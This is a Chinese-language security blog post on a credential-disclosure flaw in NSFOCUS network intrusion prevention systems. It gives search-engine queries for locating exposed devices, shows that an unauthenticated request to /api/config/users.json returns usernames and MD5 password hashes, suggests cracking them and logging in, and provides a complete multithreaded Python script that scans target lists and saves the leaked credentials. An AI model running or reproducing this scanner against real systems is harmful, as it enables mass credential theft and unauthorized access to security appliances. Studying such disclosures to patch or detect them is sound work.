> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzA3NTc0MTA1Mg==&mid=2664712380&idx=1&sn=7700a12a66238c5693b4b3853877b1fa

#  绿盟网络入侵防护系统users.json敏感信息泄露漏洞  
原创 simeon的文章  小兵搞安全   2025-07-03 10:12  
  
## 1.1漏洞简介  
  
绿盟网络入侵防护系统某版本存在敏感信息泄露漏洞，通过访问https://ip/api/config/users.json，即可获取NIPS的用户名及密码等信息。NIPS中的密码是采用md5加密，可以进行暴力破解。  
## 1.2资产测绘发现  
  
1.fofa搜索  
  
body="We're sorry but ipsweb" || title="NSFOCUS NIDPS"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VF71gsPLHVnnZhhEjoIGjmNyspOpWlmYdmSzkEt7BwEQsqOvHNpianFOsmYwMya1jIBSHyyWzGXp9w/640?wx_fmt=png&from=appmsg "")  
  
2.quacke  
  
title:"NSFOCUS NIDPS"  
  
response:"We're sorry but ipsweb"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VF71gsPLHVnnZhhEjoIGjmNngph5QNGApXQk7jgtia67BfZm27uxM788oESU4UdOfCP0tpC7hYBeTw/640?wx_fmt=png&from=appmsg "")  
## 1.3实际漏洞测试  
  
1.获取nips资产地址  
  
2.直接访问资产地址  
  
https://ip/api/config/users.json  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VF71gsPLHVnnZhhEjoIGjmNaQRrIa1Vw0rz1Ymq19DYByCg6axROORjBan6KClkV2nwm5cLQUn0UQ/640?wx_fmt=png&from=appmsg "")  
  
3.直接登录系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VF71gsPLHVnnZhhEjoIGjmNwgNQMP9RZ8TfP9Ih4nPfiaeHlEmdNUraSNib1GAavBvt1CmCDWhBl2Kg/640?wx_fmt=png&from=appmsg "")  
## 1.4自动化脚本检测  
### 1.4.1测试存在漏洞  
  
1.创建nsfocus_targets.txt文件  
  
每行一个绿盟NIPS系统的URL（支持HTTP/HTTPS）  
  
2.运行检测工具  
  
python nsfocus_vuln_detector.py  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icCXA7Jkf1VF71gsPLHVnnZhhEjoIGjmN0f2y5aa6nESzZribyEzkrAOHNry2q06iatTojwURwbnzGsNPLjNW8E5Q/640?wx_fmt=png&from=appmsg "")  
  
3.检测结果分析  
  
（1）vulnerable_systems.json：包含泄露的用户数据  
  
[  
  
  {  
  
    "url": "  
https://example-nsfocus-system.com",  
  
    "details": "用户: admin, 角色: 管理员; 用户: audit, 角色: 审计员",  
  
    "data": [  
  
      {  
  
        "name": "admin",  
  
        "password": "5f4dcc3b5aa765d61d8327deb882cf99",  // MD5哈希  
  
        "role": "管理员"  
  
      },  
  
      {  
  
        "name": "audit",  
  
        "password": "d8578edf8458ce06fbc5bb76a58c5ca4",  
  
        "role": "审计员"  
  
      }  
  
    ]  
  
  }  
  
]  
  
（2）nsfocus_vulnerability_report.csv：所有目标的检测结果  
  
（3）detection_log.txt：详细的检测日志  
  
将以下代码保存为：  
  
nsfocus_vuln_detector.py  

```
import requests
import json
import time
import csv
import socket
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed


# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_nsfocus_vulnerability(url):
    &#34;&#34;&#34;检测绿盟NIPS系统的users.json泄露漏洞&#34;&#34;&#34;
    # 构造目标URL
    target_url = url.rstrip('/') + '/api/config/users.json'


    # 准备请求参数
    session = requests.Session()
    retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))
    session.mount('http://', HTTPAdapter(max_retries=retries))


    try:
        # 发送请求（忽略SSL验证）
        response = session.get(
            target_url,
            timeout=(8, 12),  # 增加超时时间
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
        )


        # 检测漏洞特征
        if response.status_code == 200:
            try:
                data = response.json()


                # 验证是否为绿盟NIPS的用户配置文件
                is_nsfocus = False
                vuln_details = &#34;&#34;


                # 检测绿盟NIPS特有的数据结构
                if isinstance(data, list):
                    for user in data:
                        if 'name' in user and 'password' in user and 'role' in user:
                            is_nsfocus = True
                            vuln_details += f&#34;用户: {user.get('name')}, 角色: {user.get('role')}, &#34;


                if is_nsfocus:
                    return {
                        &#34;url&#34;: url,
                        &#34;status&#34;: &#34;VULNERABLE&#34;,
                        &#34;vulnerability&#34;: &#34;绿盟NIPS敏感信息泄露&#34;,
                        &#34;details&#34;: vuln_details.rstrip(', '),
                        &#34;data&#34;: data
                    }
                else:
                    return {
                        &#34;url&#34;: url,
                        &#34;status&#34;: &#34;ACCESSIBLE&#34;,
                        &#34;vulnerability&#34;: &#34;非绿盟系统或无效结构&#34;,
                        &#34;details&#34;: &#34;端点可访问但未检测到绿盟NIPS特征&#34;,
                        &#34;data&#34;: data
                    }


            except json.JSONDecodeError:
                # 响应不是JSON但仍返回200
                return {
                    &#34;url&#34;: url,
                    &#34;status&#34;: &#34;INVALID_RESPONSE&#34;,
                    &#34;vulnerability&#34;: &#34;非JSON响应&#34;,
                    &#34;details&#34;: f&#34;响应长度: {len(response.text)} 字符&#34;,
                    &#34;data&#34;: response.text[:500] + &#34;...&#34; if len(response.text) > 500 else response.text
                }
        else:
            return {
                &#34;url&#34;: url,
                &#34;status&#34;: &#34;HTTP_ERROR&#34;,
                &#34;vulnerability&#34;: &#34;端点存在但未泄露&#34;,
                &#34;details&#34;: f&#34;HTTP状态码: {response.status_code}&#34;,
                &#34;data&#34;: None
            }


    except requests.exceptions.SSLError:
        # 尝试使用HTTP代替HTTPS
        http_url = url.replace('https://', 'http://')
        return check_nsfocus_vulnerability(http_url)


    except requests.exceptions.RequestException as e:
        error_type = type(e).__name__
        return {
            &#34;url&#34;: url,
            &#34;status&#34;: &#34;CONNECTION_ERROR&#34;,
            &#34;vulnerability&#34;: &#34;连接失败&#34;,
            &#34;details&#34;: f&#34;{error_type}: {str(e)}&#34;,
            &#34;data&#34;: None
        }


    except Exception as e:
        return {
            &#34;url&#34;: url,
            &#34;status&#34;: &#34;UNKNOWN_ERROR&#34;,
            &#34;vulnerability&#34;: &#34;检测异常&#34;,
            &#34;details&#34;: f&#34;错误: {str(e)}&#34;,
            &#34;data&#34;: None
        }


def main():
    # 输入输出文件配置
    input_file = &#34;nsfocus_targets.txt&#34;
    report_file = &#34;nsfocus_vulnerability_report.csv&#34;
    vulnerable_file = &#34;vulnerable_systems.json&#34;
    log_file = &#34;detection_log.txt&#34;


    # 读取目标URL列表
    try:
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f&#34;错误: 输入文件 {input_file} 不存在&#34;)
        return


    if not urls:
        print(&#34;错误: 输入文件中没有有效的URL&#34;)
        return


    print(f&#34;开始检测 {len(urls)} 个绿盟NIPS系统...&#34;)


    vulnerable_systems = []
    report_data = []


    # 使用线程池并发检测
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(check_nsfocus_vulnerability, url): url for url in urls}


        for i, future in enumerate(as_completed(futures)):
            url = futures[future]
            try:
                result = future.result()
                report_data.append(result)


                # 记录到日志
                log_entry = f&#34;[{i+1}/{len(urls)}] {url} - {result['status']}: {result['vulnerability']}&#34;
                print(log_entry)


                # 保存易受攻击的系统
                if result['status'] == &#34;VULNERABLE&#34;:
                    vulnerable_systems.append({
                        &#34;url&#34;: result['url'],
                        &#34;details&#34;: result['details'],
                        &#34;data&#34;: result['data']
                    })
                    print(f&#34;!!! 发现漏洞 !!! {url}&#34;)


            except Exception as e:
                error_result = {
                    &#34;url&#34;: url,
                    &#34;status&#34;: &#34;PROCESSING_ERROR&#34;,
                    &#34;vulnerability&#34;: &#34;结果处理失败&#34;,
                    &#34;details&#34;: f&#34;错误: {str(e)}&#34;,
                    &#34;data&#34;: None
                }
                report_data.append(error_result)
                print(f&#34;[{i+1}/{len(urls)}] 处理失败: {url} ({str(e)})&#34;)


    # 生成漏洞报告
    with open(report_file, 'w', newline='', encoding='utf-8') as f:
        fieldnames = ['url', 'status', 'vulnerability', 'details']
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        for row in report_data:
            writer.writerow({k: v for k, v in row.items() if k in fieldnames})


    # 保存易受攻击系统的详细信息
    with open(vulnerable_file, 'w', encoding='utf-8') as f:
        json.dump(vulnerable_systems, f, indent=2, ensure_ascii=False)


    # 保存完整日志
    with open(log_file, 'w', encoding='utf-8') as f:
        f.write(f&#34;绿盟NIPS敏感信息泄露检测报告\n&#34;)
        f.write(f&#34;检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n&#34;)
        f.write(f&#34;检测目标数量: {len(urls)}\n&#34;)
        f.write(f&#34;发现漏洞数量: {len(vulnerable_systems)}\n\n&#34;)


        for result in report_data:
            f.write(f&#34;URL: {result['url']}\n&#34;)
            f.write(f&#34;状态: {result['status']}\n&#34;)
            f.write(f&#34;漏洞类型: {result['vulnerability']}\n&#34;)
            f.write(f&#34;详细信息: {result['details']}\n&#34;)
            f.write(&#34;-&#34; * 50 + &#34;\n&#34;)


    elapsed = time.time() - start_time
    print(f&#34;\n检测完成! 耗时: {elapsed:.2f}秒&#34;)
    print(f&#34;检测目标总数: {len(urls)}&#34;)
    print(f&#34;存在漏洞系统: {len(vulnerable_systems)}&#34;)
    print(f&#34;漏洞报告: {report_file}&#34;)
    print(f&#34;漏洞详情: {vulnerable_file}&#34;)
    print(f&#34;完整日志: {log_file}&#34;)


if __name__ == &#34;__main__&#34;:
    main()
```

  
  
